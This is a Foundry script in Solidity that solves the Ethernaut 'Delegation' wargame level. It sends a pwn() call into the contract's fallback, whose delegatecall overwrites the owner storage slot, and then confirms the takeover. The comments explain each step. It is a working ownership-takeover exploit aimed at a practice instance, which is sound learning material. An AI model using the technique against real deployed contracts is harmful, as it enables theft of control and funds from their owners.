// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IDelegation} from "../src/interfaces/IDelegation.sol";

contract DelegationScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address player = vm.addr(privateKey);

        IDelegation target = IDelegation(instance);

        console2.log("--- Delegation Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Current Owner  :", target.owner());
        console2.log("Player Address :", player);

        vm.startBroadcast(privateKey);

        // Encode calldata for pwn() -> bytes4(keccak256("pwn()"))
        // cast sig "pwn()" in foundry to get the function selector
        bytes memory payload = abi.encodeWithSignature("pwn()");

        // Send transaction to Delegation contract
        // Because Delegation does not implement pwn(), it triggers fallback()
        // fallback() executes delegatecall(pwn()) on Delegate in Delegation's storage context.
        // Delegate's pwn() writes to Slot 0 (owner) with msg.sender (our player).
        (bool success,) = instance.call(payload);
        require(success, "Exploit call failed");

        vm.stopBroadcast();

        console2.log("Updated Owner  :", target.owner());
        require(target.owner() == player, "Exploit failed: owner not transferred");
        console2.log(">>> SUCCESS! Ownership taken! Submit instance in Ethernaut. <<<");
    }
}
